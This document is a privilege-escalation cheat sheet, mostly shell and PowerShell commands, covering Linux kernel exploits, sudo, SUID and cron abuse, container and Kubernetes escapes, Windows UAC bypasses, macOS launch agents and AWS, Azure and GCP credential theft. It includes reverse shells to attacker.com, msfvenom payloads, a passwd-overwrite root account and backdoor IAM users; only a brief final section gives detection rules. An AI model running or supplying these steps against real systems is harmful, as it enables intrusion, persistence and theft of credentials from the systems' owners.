# Privilege Escalation: Modern Techniques and Tools

## Overview

Privilege escalation involves gaining higher-level permissions on a system than initially obtained. Modern privilege escalation techniques target cloud environments, containerized applications, and exploit advanced kernel vulnerabilities, configuration mistakes, and service account abuse.

## Linux Privilege Escalation

### Kernel Exploits

#### CVE-2022-0847 (Dirty Pipe)

**Detection and Exploitation**
```bash
# Check kernel version
uname -a
cat /proc/version

# Download exploit
wget https://raw.githubusercontent.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits/main/exploit-1.c
gcc -o exploit-1 exploit-1.c

# Alternative Python exploit
wget https://raw.githubusercontent.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits/main/exploit.py
python3 exploit.py

# Target SUID binaries
./exploit-1 /usr/bin/passwd
```

#### CVE-2021-4034 (PwnKit)

**Polkit Privilege Escalation**
```bash
# Check for vulnerable polkit
pkexec --version

# Download exploit
git clone https://github.com/berdav/CVE-2021-4034.git
cd CVE-2021-4034
make

# Execute exploit
./cve-2021-4034

# Alternative payload
echo 'int main(void) { setuid(0); setgid(0); system("/bin/bash"); return 0; }' > payload.c
gcc payload.c -o payload
./cve-2021-4034
```

### SUID/SGID Binary Exploitation

#### SUID Binary Discovery
```bash
# Find SUID binaries
find / -perm -u=s -type f 2>/dev/null
find / -perm -4000 -type f 2>/dev/null

# Find SGID binaries
find / -perm -g=s -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null

# Check for custom SUID binaries
find / -perm -u=s -type f 2>/dev/null | grep -v '/usr/bin\|/bin\|/usr/sbin\|/sbin'
```

#### GTFOBins Exploitation
```bash
# vim SUID exploitation
vim -c ':py import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'

# find SUID exploitation
find . -exec /bin/sh -p \; -quit

# systemctl exploitation (if SUID)
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "chmod +s /bin/bash"
[Install]
WantedBy=multi-user.target' > /tmp/root.service

systemctl link /tmp/root.service
systemctl enable --now /tmp/root.service

# awk SUID exploitation
awk 'BEGIN {system("/bin/sh")}'

# cp SUID exploitation (overwrite /etc/passwd)
echo "root2:$(openssl passwd -1 password):0:0:root:/root:/bin/bash" > /tmp/passwd
cp /tmp/passwd /etc/passwd
su root2
```

### Sudo Misconfiguration

#### Sudo Enumeration
```bash
# Check sudo permissions
sudo -l

# Check sudo version for known CVEs
sudo --version

# Check for NOPASSWD entries
sudo -l | grep NOPASSWD
```

#### Common Sudo Exploitation

**Wildcard Exploitation**
```bash
# If sudo allows: /bin/tar -cf /dev/null *
echo 'bash -i >& /dev/tcp/attacker.com/4444 0>&1' > payload.sh
chmod +x payload.sh
sudo /bin/tar -cf /dev/null * --checkpoint=1 --checkpoint-action=exec=sh\ payload.sh

# If sudo allows: /usr/bin/rsync *
echo 'bash -i >& /dev/tcp/attacker.com/4444 0>&1' > payload.sh
chmod +x payload.sh
sudo /usr/bin/rsync -e 'sh payload.sh' /dev/null 127.0.0.1:/dev/null
```

**Environment Variable Exploitation**
```bash
# LD_PRELOAD exploitation
echo 'void _init() { setuid(0); setgid(0); system("/bin/bash"); }' > shell.c
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
sudo LD_PRELOAD=./shell.so program

# LD_LIBRARY_PATH exploitation
ldd /usr/bin/sudo_program
echo 'void puts() { system("/bin/bash"); }' > puts.c
gcc -fPIC -shared -o libputsfake.so puts.c
sudo LD_LIBRARY_PATH=. program
```

**Python Library Hijacking**
```bash
# If sudo allows Python script in writable directory
echo 'import os; os.system("/bin/bash")' > library.py
sudo /usr/bin/python3 /path/to/script.py

# sys.path hijacking
python3 -c "import sys; print('\n'.join(sys.path))"
echo 'import os; os.system("/bin/bash")' > /tmp/subprocess.py
export PYTHONPATH=/tmp
sudo /usr/bin/python3 script_that_imports_subprocess.py
```

### Service Exploitation

#### Systemd Service Abuse
```bash
# Check writable service files
find /etc/systemd -name "*.service" -writable 2>/dev/null
find /usr/lib/systemd -name "*.service" -writable 2>/dev/null

# Create malicious service
cat << 'EOF' > /tmp/privesc.service
[Unit]
Description=Privilege Escalation Service

[Service]
Type=oneshot
ExecStart=/bin/bash -c 'chmod +s /bin/bash'
User=root

[Install]
WantedBy=multi-user.target
EOF

# Enable and start service
systemctl link /tmp/privesc.service
systemctl enable privesc.service
systemctl start privesc.service

# Use SUID bash
bash -p
```

#### Cron Job Exploitation
```bash
# Check cron jobs
crontab -l
ls -la /etc/cron*
cat /etc/crontab

# Check for writable cron files
find /etc/cron* -type f -writable 2>/dev/null

# Monitor cron execution
pspy64 # Process monitor tool

# Example: Writable script in cron
echo '#!/bin/bash' > /path/to/writable/script.sh
echo 'chmod +s /bin/bash' >> /path/to/writable/script.sh
chmod +x /path/to/writable/script.sh
```

### Container Escape Techniques

#### Docker Container Escape

**Privileged Container Detection**
```bash
# Check for privileged mode
if [ -c /dev/kmsg ]; then
    echo "Running in privileged container"
fi

# Check capabilities
capsh --print
grep Cap /proc/self/status

# Check for Docker socket mount
ls -la /var/run/docker.sock

# Escape via mounted Docker socket
docker run -v /:/host -it ubuntu chroot /host bash
```

**Host Path Mount Escape**
```bash
# Check for host mounts
mount | grep -E '/host|/proc|/sys'
df -h

# Common escape paths
ls -la /host-root/
ls -la /host-proc/
ls -la /host-sys/

# Chroot to host
chroot /host-root bash
```

**Capabilities-based Escape**
```bash
# CAP_SYS_ADMIN abuse
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp
echo 1 > /tmp/cgrp/cgroup.procs

# CAP_SYS_PTRACE abuse
gdb -p 1 -batch -ex 'call system("id")'
```

#### Kubernetes Pod Escape

**Service Account Token Abuse**
```bash
# Check service account
cat /var/run/secrets/kubernetes.io/serviceaccount/token
export KUBE_TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)

# API server communication
curl -H "Authorization: Bearer $KUBE_TOKEN" \
  --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt \
  https://kubernetes/api/v1/namespaces/default/pods

# Create privileged pod
cat << 'EOF' > /tmp/privpod.yaml
apiVersion: v1
kind: Pod
metadata:
  name: privpod
spec:
  containers:
  - name: privcontainer
    image: ubuntu:latest
    command: ["/bin/bash"]
    args: ["-c", "while true; do sleep 3600; done"]
    securityContext:
      privileged: true
    volumeMounts:
    - name: host-root
      mountPath: /host
  volumes:
  - name: host-root
    hostPath:
      path: /
  hostNetwork: true
  hostPID: true
EOF

kubectl apply -f /tmp/privpod.yaml
kubectl exec -it privpod -- chroot /host bash
```

**Node Host Access**
```bash
# Check for hostPath mounts
mount | grep '/host'
ls -la /host/

# Access host processes
ps aux | head -20

# Host network access
netstat -tulnp
ss -tulnp

# Access host files
cat /host/etc/passwd
cat /host/etc/shadow
```

## Windows Privilege Escalation

### Windows Service Exploitation

#### Service Binary Path Hijacking
```powershell
# Find services with unquoted service paths
Get-WmiObject -Class win32_service | Where-Object {$_.PathName -notmatch "`"" -and $_.PathName -notmatch "system32"} | Select Name,PathName,State

# Check service permissions
.\accesschk.exe -accepteula -uwcqv "Authenticated Users" *
.\accesschk.exe -accepteula -qwcu "Users" *

# Replace service binary
copy payload.exe "C:\Program Files\Service\service.exe"
net start service
```

#### Service DLL Hijacking
```powershell
# Find services loading DLLs from writable locations
Get-Process | ForEach-Object { $_.Modules } | Where-Object { $_.FileName -like "*\System32\*" }

# Process Monitor (ProcMon) to find missing DLLs
# Filter: Process Name is service.exe, Result is NAME NOT FOUND

# Create malicious DLL
# Use msfvenom: msfvenom -p windows/shell_reverse_tcp LHOST=attacker.com LPORT=4444 -f dll -o malicious.dll
copy malicious.dll "C:\Writable\Path\missing.dll"
net restart service
```

### Registry Exploitation

#### AlwaysInstallElevated
```powershell
# Check if AlwaysInstallElevated is enabled
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Create malicious MSI
msfvenom -p windows/shell_reverse_tcp LHOST=attacker.com LPORT=4444 -f msi -o malicious.msi

# Install with elevated privileges
msiexec /quiet /qn /i malicious.msi
```

#### Autorun Registry Keys
```powershell
# Check writable autorun registry keys
reg query HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run

# Check permissions on registry keys
.\accesschk.exe -accepteula -kw HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run

# Add malicious entry
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "Backdoor" /t REG_SZ /d "C:\path\to\payload.exe" /f
```

### Token Impersonation

#### Token Manipulation Tools
```powershell
# Using Incognito
load incognito
list_tokens -u
impersonate_token "NT AUTHORITY\SYSTEM"

# Using PowerShell
# Load PowerView
. .\PowerView.ps1

# Find processes with tokens
Get-Process | Where-Object { $_.ProcessName -eq "winlogon" -or $_.ProcessName -eq "lsass" }

# Token stealing with Invoke-TokenManipulation
Invoke-TokenManipulation -CreateProcess "cmd.exe" -ProcessId 1234
```

### UAC Bypass Techniques

#### UACMe Tool Usage
```powershell
# Download UACMe
# https://github.com/hfiref0x/UACME

# List available methods
.\Akagi64.exe

# Method 23 - fodhelper.exe
.\Akagi64.exe 23 C:\path\to\payload.exe

# Method 33 - sdclt.exe
.\Akagi64.exe 33 C:\path\to\payload.exe

# Method 61 - appinfo.dll
.\Akagi64.exe 61 C:\path\to\payload.exe
```

#### Manual UAC Bypass
```powershell
# fodhelper.exe bypass
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
New-ItemProperty "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "cmd /c start C:\path\to\payload.exe" -Force
Start-Process "C:\Windows\System32\fodhelper.exe"

# Cleanup
Remove-Item "HKCU:\Software\Classes\ms-settings" -Recurse -Force
```

## macOS Privilege Escalation

### macOS-Specific Techniques

#### SUDO TCC Bypass
```bash
# Check TCC database
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db "SELECT * FROM access;"

# Synthetic.conf abuse (if writable)
echo -e "usr\tlocal/bin" >> /etc/synthetic.conf
/usr/sbin/synthetic_verify

# Create malicious binary in new path
mkdir -p /usr/local/bin
cp /bin/bash /usr/local/bin/sudo
chmod +s /usr/local/bin/sudo
```

#### Launch Agents/Daemons Exploitation
```bash
# Check writable launch agent directories
find /Library/LaunchAgents -writable 2>/dev/null
find /Library/LaunchDaemons -writable 2>/dev/null
find ~/Library/LaunchAgents -writable 2>/dev/null

# Create malicious launch agent
cat << 'EOF' > ~/Library/LaunchAgents/com.malicious.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.malicious</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/bash</string>
        <string>-c</string>
        <string>chmod +s /bin/bash</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>
EOF

# Load the agent
launchctl load ~/Library/LaunchAgents/com.malicious.plist
```

## Cloud Platform Privilege Escalation

### AWS Privilege Escalation

#### IAM Role Assumption Chain
```bash
# Check current identity
aws sts get-caller-identity

# List assumable roles
aws iam list-roles --query 'Roles[?contains(AssumeRolePolicyDocument, `sts:AssumeRole`)].RoleName'

# Attempt role assumption
aws sts assume-role --role-arn arn:aws:iam::ACCOUNT:role/HighPrivRole --role-session-name "PrivEsc"

# Use temporary credentials
export AWS_ACCESS_KEY_ID=TEMP_KEY
export AWS_SECRET_ACCESS_KEY=TEMP_SECRET
export AWS_SESSION_TOKEN=SESSION_TOKEN

# Check new permissions
aws iam get-user
aws iam list-attached-user-policies --user-name current-user
```

#### EC2 Instance Profile Abuse
```bash
# Check for instance metadata access
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Get instance role credentials
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2-Role-Name

# Use instance credentials
aws configure set aws_access_key_id INSTANCE_ACCESS_KEY
aws configure set aws_secret_access_key INSTANCE_SECRET_KEY
aws configure set aws_session_token INSTANCE_TOKEN

# Escalate privileges through attached policies
aws iam create-user --user-name backdoor-user
aws iam attach-user-policy --user-name backdoor-user --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```

### Azure Privilege Escalation

#### Managed Identity Exploitation
```bash
# Check for managed identity
curl -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# Get access token
TOKEN=$(curl -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" | jq -r .access_token)

# Use token to access Azure resources
curl -H "Authorization: Bearer $TOKEN" "https://management.azure.com/subscriptions?api-version=2020-01-01"

# Create new service principal with high privileges
az ad sp create-for-rbac --role="Contributor" --scopes="/subscriptions/subscription-id"
```

#### Azure AD Application Permissions
```bash
# List application permissions
az ad app permission list --id application-id

# Grant additional permissions
az ad app permission add --id application-id --api 00000003-0000-0000-c000-000000000000 --api-permissions 9e3f62cf-ca93-4989-b6ce-bf83c28f9fe8=Role

# Admin consent for permissions
az ad app permission admin-consent --id application-id
```

### GCP Privilege Escalation

#### Service Account Key Creation
```bash
# List current permissions
gcloud auth list
gcloud projects get-iam-policy project-id

# Create service account key (if permitted)
gcloud iam service-accounts keys create key.json --iam-account=target-sa@project.iam.gserviceaccount.com

# Activate service account
gcloud auth activate-service-account --key-file=key.json

# Check new permissions
gcloud projects get-iam-policy project-id
```

#### Compute Engine Metadata Abuse
```bash
# Check for default service account access
curl -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"

# Get access token
TOKEN=$(curl -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" | jq -r .access_token)

# Use token for API calls
curl -H "Authorization: Bearer $TOKEN" "https://compute.googleapis.com/compute/v1/projects/project-id/zones"

# Create new service account with admin privileges
gcloud iam service-accounts create backdoor-sa --display-name="Backdoor Service Account"
gcloud projects add-iam-policy-binding project-id --member="serviceAccount:backdoor-sa@project-id.iam.gserviceaccount.com" --role="roles/owner"
```

## Automated Privilege Escalation Tools

### LinPEAS (Linux)
```bash
# Download and run LinPEAS
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh
chmod +x linpeas.sh
./linpeas.sh

# Run with specific checks
./linpeas.sh -a  # All checks
./linpeas.sh -s  # Superfast
./linpeas.sh -P  # Show processes
```

### WinPEAS (Windows)
```powershell
# Download and run WinPEAS
Invoke-WebRequest -Uri "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe" -OutFile "winPEAS.exe"
.\winPEAS.exe

# Run with specific options
.\winPEAS.exe fast
.\winPEAS.exe systeminfo
.\winPEAS.exe userinfo
```

### PrivEsc Scripts Collection
```bash
# Linux enumeration scripts
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh

# Linux Smart Enumeration
wget https://github.com/diego-treitos/linux-smart-enumeration/raw/master/lse.sh
chmod +x lse.sh
./lse.sh -l1  # Level 1 checks

# Unix Privilege Escalation Check
wget https://pentestmonkey.net/tools/audit/unix-privesc-check
chmod +x unix-privesc-check
./unix-privesc-check standard
```

### BeRoot Multi-platform
```bash
# Install BeRoot
git clone https://github.com/AlessandroZ/BeRoot.git
cd BeRoot

# Linux version
cd Linux
python beroot.py

# Windows version (on Windows)
cd Windows
python beroot.py

# Check specific privilege escalation vectors
python beroot.py --check=sudo
python beroot.py --check=suid
```

## Privilege Escalation Detection

### Detection Tools and Techniques

#### Sysmon Configuration for PrivEsc Detection
```xml
<!-- Sysmon configuration for privilege escalation detection -->
<Sysmon schemaversion="4.70">
  <EventFiltering>
    <!-- Process Creation -->
    <ProcessCreate onmatch="include">
      <CommandLine condition="contains">whoami</CommandLine>
      <CommandLine condition="contains">net user</CommandLine>
      <CommandLine condition="contains">net localgroup</CommandLine>
      <CommandLine condition="contains">reg query</CommandLine>
      <CommandLine condition="contains">accesschk</CommandLine>
    </ProcessCreate>

    <!-- Registry Events -->
    <RegistryEvent onmatch="include">
      <TargetObject condition="contains">CurrentVersion\Run</TargetObject>
      <TargetObject condition="contains">CurrentVersion\Winlogon</TargetObject>
      <TargetObject condition="contains">Windows\Installer</TargetObject>
    </RegistryEvent>

    <!-- Process Access -->
    <ProcessAccess onmatch="include">
      <TargetImage condition="is">C:\Windows\System32\lsass.exe</TargetImage>
    </ProcessAccess>
  </EventFiltering>
</Sysmon>
```

#### Linux Auditd Rules
```bash
# Add to /etc/audit/rules.d/privesc.rules
-a always,exit -F arch=b64 -S execve -F euid=0 -F auid!=0 -k privilege_escalation
-a always,exit -F arch=b32 -S execve -F euid=0 -F auid!=0 -k privilege_escalation
-w /etc/passwd -p wa -k identity
-w /etc/shadow -p wa -k identity
-w /etc/sudoers -p wa -k privilege_escalation
-w /usr/bin/sudo -p x -k privilege_escalation

# Restart auditd
sudo systemctl restart auditd

# Search for privilege escalation events
ausearch -k privilege_escalation
```

### Honeypot Detection
```bash
# Create honeypot SUID binary
cat << 'EOF' > /tmp/honeypot.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <syslog.h>

int main() {
    syslog(LOG_ALERT, "SECURITY ALERT: Honeypot SUID binary executed by UID %d", getuid());
    printf("Access denied\n");
    return 1;
}
EOF

gcc -o /usr/local/bin/honeypot /tmp/honeypot.c
chmod 4755 /usr/local/bin/honeypot
chown root:root /usr/local/bin/honeypot
```

## References and Resources

- [MITRE ATT&CK Privilege Escalation](https://attack.mitre.org/tactics/TA0004/)
- [GTFOBins](https://gtfobins.github.io/) - Unix binaries that can be used to bypass local security restrictions
- [LOLBAS](https://lolbas-project.github.io/) - Living Off The Land Binaries, Scripts and Libraries
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation)
- [HackTricks Privilege Escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)
- [Windows Privilege Escalation Fundamentals](https://www.fuzzysecurity.com/tutorials/16.html)